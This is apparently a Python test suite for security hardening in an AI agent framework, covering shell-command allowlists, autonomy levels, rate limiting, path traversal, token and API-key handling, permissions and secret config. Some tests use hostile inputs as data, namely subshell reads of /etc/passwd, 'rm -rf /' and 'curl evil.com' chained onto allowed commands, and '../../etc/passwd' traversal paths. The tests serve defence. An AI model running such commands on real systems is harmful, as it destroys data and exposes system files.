"""Tests for Phase 14 security hardening — all 12 items.

Item 1: Multi-segment command validation (shell.py, governance.py)
Item 2: Autonomy levels (definition.py, governance.py, runtime.py)
Item 3: Rate limiting on tool execution (governance.py, config.py)
Item 4: Path traversal hardening (file_ops.py)
Item 5: tenant_id in TokenPayload (auth.py)
Item 6: Session ownership model (memory_search.py)
Item 7: run_command.py env preserves PATH (run_command.py)
Item 8: API key expiration support (auth.py)
Item 9: Deny-first permission evaluation (permissions.py)
Item 10: Pairing brute-force lockout (pairing.py)
Item 11: Request size limits (main.py)
Item 12: SecretStr for sensitive config (config.py)
"""

from __future__ import annotations

import time
from typing import TYPE_CHECKING

import pytest
from pydantic import SecretStr

if TYPE_CHECKING:
    from pathlib import Path

    from fastapi.testclient import TestClient


# ============================================================================
# Item 1: Multi-segment command validation
# ============================================================================


class TestMultiSegmentCommandValidation:
    """Shell tool must validate ALL segments of piped/chained commands."""

    @pytest.mark.asyncio
    async def test_subshell_injection_blocked(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.builtin.shell import ShellTool

        tool = ShellTool()
        ctx = ToolContext(command_allowlist=["echo", "ls"])
        result = await tool.execute({"command": "echo $(cat /etc/passwd)"}, ctx)
        assert not result.success
        assert "subshell" in result.error.lower() or "$(" in result.error

    @pytest.mark.asyncio
    async def test_backtick_injection_blocked(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.builtin.shell import ShellTool

        tool = ShellTool()
        ctx = ToolContext(command_allowlist=["echo"])
        result = await tool.execute({"command": "echo `whoami`"}, ctx)
        assert not result.success
        assert "subshell" in result.error.lower() or "backtick" in result.error.lower()

    @pytest.mark.asyncio
    async def test_pipe_second_segment_blocked(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.builtin.shell import ShellTool

        tool = ShellTool()
        ctx = ToolContext(command_allowlist=["echo"])
        # "echo hello | cat" — echo is allowed but cat is not
        result = await tool.execute({"command": "echo hello | cat"}, ctx)
        assert not result.success
        assert "cat" in result.error
        assert "not in the allowlist" in result.error

    @pytest.mark.asyncio
    async def test_semicolon_chain_all_validated(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.builtin.shell import ShellTool

        tool = ShellTool()
        ctx = ToolContext(command_allowlist=["echo"])
        result = await tool.execute({"command": "echo ok ; rm -rf /"}, ctx)
        assert not result.success
        assert "rm" in result.error

    @pytest.mark.asyncio
    async def test_and_chain_all_validated(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.builtin.shell import ShellTool

        tool = ShellTool()
        ctx = ToolContext(command_allowlist=["echo"])
        result = await tool.execute({"command": "echo ok && curl evil.com"}, ctx)
        assert not result.success
        assert "curl" in result.error

    @pytest.mark.asyncio
    async def test_all_segments_allowed_passes(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.builtin.shell import ShellTool

        tool = ShellTool()
        ctx = ToolContext(command_allowlist=["echo", "grep"])
        # This should parse but may fail at execution — the point is it
        # passes the validation stage.
        result = await tool.execute({"command": "echo hello | grep hello"}, ctx)
        # It passed validation (no "not in the allowlist" error)
        assert "not in the allowlist" not in (result.error or "")


class TestGovernanceMultiSegment:
    """ToolGovernance._validate_command also does multi-segment checking."""

    def test_governance_blocks_subshell(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(command_allowlist=["echo"])
        assert not gov._validate_command("echo $(whoami)", ctx)

    def test_governance_blocks_chained_unlisted(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(command_allowlist=["echo"])
        assert not gov._validate_command("echo ok && rm -rf /", ctx)

    def test_governance_allows_no_allowlist(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext()  # No allowlist
        # Subshells are still blocked even without allowlist
        assert not gov._validate_command("echo $(whoami)", ctx)
        # But normal commands pass without allowlist
        assert gov._validate_command("ls -la", ctx)


# ============================================================================
# Item 2: Autonomy levels
# ============================================================================


class TestAutonomyLevels:
    """Autonomy levels restrict what tools an agent can use."""

    def test_autonomy_level_enum_values(self) -> None:
        from agent33.agents.definition import AutonomyLevel

        assert AutonomyLevel.READ_ONLY.value == "read-only"
        assert AutonomyLevel.SUPERVISED.value == "supervised"
        assert AutonomyLevel.FULL.value == "full"

    def test_agent_definition_default_supervised(self) -> None:
        from agent33.agents.definition import AgentDefinition, AutonomyLevel

        defn = AgentDefinition(name="test-agent", version="1.0.0", role="implementer")
        assert defn.autonomy_level == AutonomyLevel.SUPERVISED

    def test_agent_definition_explicit_readonly(self) -> None:
        from agent33.agents.definition import AgentDefinition, AutonomyLevel

        defn = AgentDefinition(
            name="test-agent",
            version="1.0.0",
            role="implementer",
            autonomy_level="read-only",
        )
        assert defn.autonomy_level == AutonomyLevel.READ_ONLY

    def test_readonly_blocks_shell(self) -> None:
        from agent33.agents.definition import AutonomyLevel
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(user_scopes=["tools:execute"])
        assert not gov.pre_execute_check(
            "shell", {"command": "ls"}, ctx, autonomy_level=AutonomyLevel.READ_ONLY
        )

    def test_readonly_blocks_file_ops(self) -> None:
        from agent33.agents.definition import AutonomyLevel
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(user_scopes=["tools:execute"])
        assert not gov.pre_execute_check(
            "file_ops",
            {"operation": "write", "path": "/tmp/x"},
            ctx,
            autonomy_level=AutonomyLevel.READ_ONLY,
        )

    def test_full_allows_shell(self) -> None:
        from agent33.agents.definition import AutonomyLevel
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(user_scopes=["tools:execute"])
        assert gov.pre_execute_check(
            "shell", {"command": "ls"}, ctx, autonomy_level=AutonomyLevel.FULL
        )

    def test_autonomy_in_system_prompt(self) -> None:
        from agent33.agents.definition import AgentDefinition, AutonomyLevel
        from agent33.agents.runtime import _build_system_prompt

        defn = AgentDefinition(
            name="test-agent",
            version="1.0.0",
            role="implementer",
            autonomy_level=AutonomyLevel.READ_ONLY,
        )
        prompt = _build_system_prompt(defn)
        assert "read-only" in prompt.lower()
        assert "ONLY read data" in prompt


# ============================================================================
# Item 3: Rate limiting on tool execution
# ============================================================================


class TestRateLimiting:
    """Governance rate limiter uses sliding window with burst control."""

    def test_within_limit_allowed(self) -> None:
        from agent33.tools.governance import _RateLimiter

        limiter = _RateLimiter(per_minute=5, burst=3)
        assert limiter.check("user1")
        assert limiter.check("user1")
        assert limiter.check("user1")

    def test_burst_limit_exceeded(self) -> None:
        from agent33.tools.governance import _RateLimiter

        limiter = _RateLimiter(per_minute=100, burst=2)
        assert limiter.check("user1")
        assert limiter.check("user1")
        assert not limiter.check("user1")  # Burst exceeded

    def test_per_minute_limit_exceeded(self) -> None:
        from agent33.tools.governance import _RateLimiter

        limiter = _RateLimiter(per_minute=3, burst=100)
        assert limiter.check("user1")
        assert limiter.check("user1")
        assert limiter.check("user1")
        assert not limiter.check("user1")  # Per-minute exceeded

    def test_different_subjects_independent(self) -> None:
        from agent33.tools.governance import _RateLimiter

        limiter = _RateLimiter(per_minute=2, burst=100)
        assert limiter.check("user1")
        assert limiter.check("user1")
        assert not limiter.check("user1")
        # user2 has its own window
        assert limiter.check("user2")

    def test_governance_rate_limit_integration(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        gov._rate_limiter = __import__(
            "agent33.tools.governance", fromlist=["_RateLimiter"]
        )._RateLimiter(per_minute=2, burst=100)
        ctx = ToolContext(user_scopes=["tools:execute"])
        assert gov.pre_execute_check("shell", {"command": "ls"}, ctx)
        assert gov.pre_execute_check("shell", {"command": "ls"}, ctx)
        assert not gov.pre_execute_check("shell", {"command": "ls"}, ctx)

    def test_rate_limit_config_fields_exist(self) -> None:
        from agent33.config import Settings

        s = Settings()
        assert s.rate_limit_per_minute == 60
        assert s.rate_limit_burst == 10


# ============================================================================
# Item 4: Path traversal hardening
# ============================================================================


class TestPathTraversalHardening:
    """FileOpsTool blocks path traversal attacks."""

    @pytest.mark.asyncio
    async def test_null_byte_blocked(self, tmp_path: Path) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.builtin.file_ops import FileOpsTool

        tool = FileOpsTool()
        ctx = ToolContext(path_allowlist=[str(tmp_path)])
        result = await tool.execute({"operation": "read", "path": f"{tmp_path}/test\x00.txt"}, ctx)
        assert not result.success
        assert "null byte" in result.error.lower()

    @pytest.mark.asyncio
    async def test_dot_dot_traversal_blocked(self, tmp_path: Path) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.builtin.file_ops import FileOpsTool

        tool = FileOpsTool()
        safe_dir = tmp_path / "safe"
        safe_dir.mkdir()
        ctx = ToolContext(path_allowlist=[str(safe_dir)])
        result = await tool.execute(
            {"operation": "read", "path": f"{safe_dir}/../../etc/passwd"}, ctx
        )
        assert not result.success
        assert "outside" in result.error.lower()

    def test_path_allowed_uses_relative_to(self, tmp_path: Path) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.builtin.file_ops import FileOpsTool

        safe_dir = tmp_path / "safe"
        safe_dir.mkdir()
        other_dir = tmp_path / "other"
        other_dir.mkdir()

        ctx = ToolContext(path_allowlist=[str(safe_dir)])
        # Path within allowlist
        assert FileOpsTool._path_allowed(safe_dir / "file.txt", ctx)
        sub = safe_dir / "sub"
        sub.mkdir()
        assert FileOpsTool._path_allowed(sub / "file.txt", ctx)
        # Path outside allowlist
        assert not FileOpsTool._path_allowed(other_dir / "file.txt", ctx)

    @pytest.mark.asyncio
    async def test_write_checks_parent_directory(self, tmp_path: Path) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.builtin.file_ops import FileOpsTool

        tool = FileOpsTool()
        safe_dir = tmp_path / "safe"
        safe_dir.mkdir()
        ctx = ToolContext(path_allowlist=[str(safe_dir)])
        # Writing to a path where the parent is outside allowlist
        other = tmp_path / "other" / "bad.txt"
        result = await tool.execute(
            {"operation": "write", "path": str(other), "content": "bad"}, ctx
        )
        assert not result.success
        assert "outside" in result.error.lower()


# ============================================================================
# Item 5: tenant_id in TokenPayload
# ============================================================================


class TestTenantIdInToken:
    """JWT and API keys carry tenant_id for multi-tenant isolation."""

    def test_token_payload_has_tenant_id(self) -> None:
        from agent33.security.auth import TokenPayload

        payload = TokenPayload(sub="user1", scopes=["admin"], tenant_id="tenant-abc")
        assert payload.tenant_id == "tenant-abc"

    def test_token_payload_tenant_id_default_empty(self) -> None:
        from agent33.security.auth import TokenPayload

        payload = TokenPayload(sub="user1")
        assert payload.tenant_id == ""

    def test_jwt_roundtrip_with_tenant_id(self) -> None:
        from agent33.security.auth import create_access_token, verify_token

        token = create_access_token("user1", scopes=["admin"], tenant_id="t-123")
        payload = verify_token(token)
        assert payload.sub == "user1"
        assert payload.tenant_id == "t-123"

    def test_jwt_without_tenant_id_still_works(self) -> None:
        from agent33.security.auth import create_access_token, verify_token

        token = create_access_token("user1", scopes=["admin"])
        payload = verify_token(token)
        assert payload.sub == "user1"
        assert payload.tenant_id == ""

    def test_api_key_with_tenant_id(self) -> None:
        from agent33.security.auth import generate_api_key, validate_api_key

        result = generate_api_key("user1", scopes=["admin"], tenant_id="t-456")
        assert result["tenant_id"] == "t-456"

        payload = validate_api_key(result["key"])
        assert payload is not None
        assert payload.tenant_id == "t-456"


# ============================================================================
# Item 6: Session ownership model
# ============================================================================


class TestSessionOwnership:
    """Memory routes enforce session ownership via authenticated user subject."""

    def test_list_observations_requires_auth(self, client: TestClient) -> None:
        resp = client.get("/v1/memory/sessions/test-session/observations")
        # Should succeed with auth (may get 503 if memory not initialized)
        assert resp.status_code in (200, 503)

    def test_summarize_requires_auth(self, client: TestClient) -> None:
        resp = client.post("/v1/memory/sessions/test-session/summarize")
        assert resp.status_code in (404, 503)


# ============================================================================
# Item 7: run_command.py env preserves PATH
# ============================================================================


class TestRunCommandEnvPreservation:
    """run_command action must merge inputs with os.environ, not replace."""

    @pytest.mark.asyncio
    async def test_env_preserves_path(self) -> None:
        from agent33.workflows.actions.run_command import execute

        # Run a command that needs PATH to find executables
        result = await execute(
            command="python --version",
            inputs={"MY_CUSTOM_VAR": "hello"},
            timeout_seconds=10,
        )
        assert result["return_code"] == 0
        assert "Python" in result["stdout"] or "python" in result["stdout"].lower()

    @pytest.mark.asyncio
    async def test_env_includes_custom_vars(self) -> None:
        import sys

        from agent33.workflows.actions.run_command import execute

        # On Windows use 'set' or 'echo', on Unix use 'env'
        if sys.platform == "win32":
            result = await execute(
                command="echo %MY_VAR%",
                inputs={"MY_VAR": "test_value"},
                timeout_seconds=10,
            )
        else:
            result = await execute(
                command="env",
                inputs={"MY_VAR": "test_value"},
                timeout_seconds=10,
            )
            assert "MY_VAR=test_value" in result["stdout"]
        assert result["return_code"] == 0


# ============================================================================
# Item 8: API key expiration support
# ============================================================================


class TestApiKeyExpiration:
    """API keys can have expiration times."""

    def test_non_expiring_key_works(self) -> None:
        from agent33.security.auth import generate_api_key, validate_api_key

        result = generate_api_key("user1", scopes=["admin"])
        assert result["expires_at"] == 0

        payload = validate_api_key(result["key"])
        assert payload is not None
        assert payload.sub == "user1"

    def test_expired_key_rejected(self) -> None:
        from agent33.security.auth import _api_keys, _hash_key, generate_api_key, validate_api_key

        result = generate_api_key("user1", scopes=["admin"], expires_in_seconds=1)
        assert result["expires_at"] > 0

        # Manually set the expiration to the past
        hashed = _hash_key(result["key"])
        _api_keys[hashed]["expires_at"] = int(time.time()) - 10

        payload = validate_api_key(result["key"])
        assert payload is None  # Expired key rejected

    def test_valid_expiring_key_accepted(self) -> None:
        from agent33.security.auth import generate_api_key, validate_api_key

        result = generate_api_key("user1", scopes=["admin"], expires_in_seconds=3600)
        payload = validate_api_key(result["key"])
        assert payload is not None
        assert payload.sub == "user1"


# ============================================================================
# Item 9: Deny-first permission evaluation
# ============================================================================


class TestDenyFirstPermissions:
    """Permission checks evaluate deny rules before allow rules."""

    def test_deny_overrides_allow(self) -> None:
        from agent33.security.permissions import check_permission

        # User has tools:execute but it's denied
        assert not check_permission(
            "tools:execute",
            ["tools:execute"],
            deny_scopes=["tools:execute"],
        )

    def test_deny_overrides_admin(self) -> None:
        from agent33.security.permissions import check_permission

        # Admin is in deny list — should be denied
        assert not check_permission(
            "tools:execute",
            ["admin"],
            deny_scopes=["admin"],
        )

    def test_admin_grants_when_not_denied(self) -> None:
        from agent33.security.permissions import check_permission

        assert check_permission("tools:execute", ["admin"])
        assert check_permission("tools:execute", ["admin"], deny_scopes=[])

    def test_no_deny_scopes_backward_compatible(self) -> None:
        from agent33.security.permissions import check_permission

        # Without deny_scopes, behavior is unchanged
        assert check_permission("tools:execute", ["tools:execute"])
        assert not check_permission("agents:write", ["tools:execute"])
        assert check_permission("agents:write", ["admin"])

    def test_deny_specific_scope_not_others(self) -> None:
        from agent33.security.permissions import check_permission

        # Deny only shell but allow other tools
        assert not check_permission(
            "tools:execute",
            ["tools:execute", "agents:read"],
            deny_scopes=["tools:execute"],
        )
        assert check_permission(
            "agents:read",
            ["tools:execute", "agents:read"],
            deny_scopes=["tools:execute"],
        )

    def test_wildcard_deny_blocks_required_scope(self) -> None:
        from agent33.security.permissions import check_permission

        # Deny tools:* blocks tools:execute
        assert not check_permission(
            "tools:execute",
            ["tools:execute"],
            deny_scopes=["tools:*"],
        )

    def test_wildcard_allow_grants_permission(self) -> None:
        from agent33.security.permissions import check_permission

        # Token has tools:* which should match tools:execute
        assert check_permission(
            "tools:execute",
            ["tools:*"],
        )

    def test_decision_api_returns_ask(self) -> None:
        from agent33.security.permissions import PermissionDecision, check_permission_decision

        # Ask scope blocks execution but signals approval needed
        decision = check_permission_decision(
            "tools:execute",
            ["tools:execute"],
            ask_scopes=["tools:execute"],
        )
        assert decision == PermissionDecision.ASK

    def test_decision_api_deny_overrides_ask(self) -> None:
        from agent33.security.permissions import PermissionDecision, check_permission_decision

        # Deny takes precedence over ask
        decision = check_permission_decision(
            "tools:execute",
            ["tools:execute"],
            deny_scopes=["tools:execute"],
            ask_scopes=["tools:execute"],
        )
        assert decision == PermissionDecision.DENY


class TestGovernanceToolPolicies:
    """Tool-specific governance policies via context.tool_policies."""

    def test_policy_deny_blocks_tool(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(
            user_scopes=["tools:execute"],
            tool_policies={"shell": "deny"},
        )
        assert not gov.pre_execute_check("shell", {"command": "ls"}, ctx)

    def test_policy_ask_blocks_tool(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(
            user_scopes=["tools:execute"],
            tool_policies={"file_ops": "ask"},
        )
        assert not gov.pre_execute_check("file_ops", {"operation": "write"}, ctx)

    def test_policy_allow_permits_tool(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(
            user_scopes=["tools:execute"],
            tool_policies={"shell": "allow"},
        )
        assert gov.pre_execute_check("shell", {"command": "ls"}, ctx)

    def test_policy_wildcard_pattern(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(
            user_scopes=["tools:execute"],
            tool_policies={"file_*": "deny"},
        )
        assert not gov.pre_execute_check("file_ops", {"operation": "read"}, ctx)
        assert not gov.pre_execute_check("file_write", {}, ctx)

    def test_policy_operation_specific(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(
            user_scopes=["tools:execute"],
            tool_policies={"file_ops:write": "deny"},
        )
        # write blocked
        assert not gov.pre_execute_check("file_ops", {"operation": "write", "path": "/tmp/x"}, ctx)
        # read allowed (no policy match, continues to normal checks)
        assert gov.pre_execute_check("file_ops", {"operation": "read", "path": "/tmp/x"}, ctx)

    def test_no_policies_uses_normal_checks(self) -> None:
        from agent33.tools.base import ToolContext
        from agent33.tools.governance import ToolGovernance

        gov = ToolGovernance()
        ctx = ToolContext(user_scopes=["tools:execute"])
        # No policies, should pass normal scope check
        assert gov.pre_execute_check("shell", {"command": "ls"}, ctx)


# ============================================================================
# Item 10: Pairing brute-force lockout
# ============================================================================


class TestPairingBruteForceLockout:
    """PairingManager locks out users after too many failed attempts."""

    def test_valid_code_succeeds(self) -> None:
        from agent33.messaging.pairing import PairingManager

        mgr = PairingManager()
        code = mgr.generate_code("telegram", "user-1")
        assert mgr.verify_code(code, "user-1")

    def test_wrong_code_records_failure(self) -> None:
        from agent33.messaging.pairing import PairingManager

        mgr = PairingManager()
        mgr.generate_code("telegram", "user-1")
        assert not mgr.verify_code("000000", "user-1")
        assert len(mgr._failed_attempts["user-1"]) == 1

    def test_lockout_after_max_attempts(self) -> None:
        from agent33.messaging.pairing import PairingManager

        mgr = PairingManager()
        mgr.generate_code("telegram", "user-1")

        # Fail 5 times
        for _ in range(5):
            mgr.verify_code("000000", "user-1")

        assert mgr.is_locked_out("user-1")

        # Even with a valid code, user is locked out
        code = mgr.generate_code("telegram", "user-1")
        assert not mgr.verify_code(code, "user-1")

    def test_success_resets_failures(self) -> None:
        from agent33.messaging.pairing import PairingManager

        mgr = PairingManager()

        # Fail 3 times
        for _ in range(3):
            mgr.verify_code("000000", "user-1")
        assert len(mgr._failed_attempts["user-1"]) == 3

        # Succeed
        code = mgr.generate_code("telegram", "user-1")
        assert mgr.verify_code(code, "user-1")

        # Failures are reset
        assert "user-1" not in mgr._failed_attempts

    def test_different_users_independent(self) -> None:
        from agent33.messaging.pairing import PairingManager

        mgr = PairingManager()

        # Lock out user-1
        for _ in range(5):
            mgr.verify_code("000000", "user-1")
        assert mgr.is_locked_out("user-1")

        # user-2 is not locked out
        assert not mgr.is_locked_out("user-2")
        code = mgr.generate_code("telegram", "user-2")
        assert mgr.verify_code(code, "user-2")


# ============================================================================
# Item 11: Request size limits
# ============================================================================


class TestRequestSizeLimits:
    """Middleware rejects oversized request bodies."""

    def test_normal_request_passes(self, client: TestClient) -> None:
        resp = client.get("/health")
        assert resp.status_code == 200

    def test_oversized_request_rejected(self, client: TestClient) -> None:
        resp = client.post(
            "/v1/chat/completions",
            json={"messages": [{"role": "user", "content": "x"}]},
            headers={
                **client.headers,
                "content-length": "999999999",
            },
        )
        assert resp.status_code == 413
        assert "too large" in resp.json()["detail"].lower()

    def test_max_request_size_config(self) -> None:
        from agent33.config import Settings

        s = Settings()
        assert s.max_request_size_bytes == 10 * 1024 * 1024  # 10 MB default


# ============================================================================
# Item 12: SecretStr for sensitive config
# ============================================================================


class TestSecretStrConfig:
    """Sensitive config fields use SecretStr to avoid accidental logging."""

    def test_jwt_secret_is_secretstr(self) -> None:
        from agent33.config import Settings

        s = Settings(jwt_secret="my-custom-secret-value", auth_bootstrap_enabled=False)
        assert isinstance(s.jwt_secret, SecretStr)
        # An explicitly set secret must be preserved unchanged.
        assert s.jwt_secret.get_secret_value() == "my-custom-secret-value"

    def test_api_secret_key_is_secretstr(self) -> None:
        from agent33.config import Settings

        s = Settings()
        assert isinstance(s.api_secret_key, SecretStr)

    def test_encryption_key_is_secretstr(self) -> None:
        from agent33.config import Settings

        s = Settings()
        assert isinstance(s.encryption_key, SecretStr)

    def test_openai_api_key_is_secretstr(self) -> None:
        from agent33.config import Settings

        s = Settings()
        assert isinstance(s.openai_api_key, SecretStr)

    def test_jina_api_key_is_secretstr(self) -> None:
        from agent33.config import Settings

        s = Settings()
        assert isinstance(s.jina_api_key, SecretStr)

    def test_secretstr_repr_hides_value(self) -> None:
        from agent33.config import Settings

        s = Settings(jwt_secret="super-secret-123")
        # repr should NOT contain the actual secret
        repr_str = repr(s.jwt_secret)
        assert "super-secret-123" not in repr_str
        assert "**" in repr_str

    def test_check_production_secrets_works_with_secretstr(self) -> None:
        from agent33.config import Settings

        # In development/lite mode, jwt_secret is auto-generated (no longer the default
        # placeholder), so only api_secret_key will trigger a warning here.
        s = Settings(
            api_secret_key="change-me-in-production",
            jwt_secret="change-me-in-production",
            auth_bootstrap_enabled=False,
            auth_bootstrap_admin_password="boot-secret-12345",
        )
        warnings = s.check_production_secrets()
        # jwt_secret was auto-generated, so only api_secret_key produces a warning.
        assert len(warnings) == 1
        assert any("api_secret_key" in w for w in warnings)

    def test_custom_secrets_pass_with_secretstr(self) -> None:
        from agent33.config import Settings

        s = Settings(
            api_secret_key="real-secret",
            jwt_secret="real-jwt-secret",
            auth_bootstrap_enabled=False,
            auth_bootstrap_admin_password="boot-secret-12345",
        )
        warnings = s.check_production_secrets()
        assert len(warnings) == 0
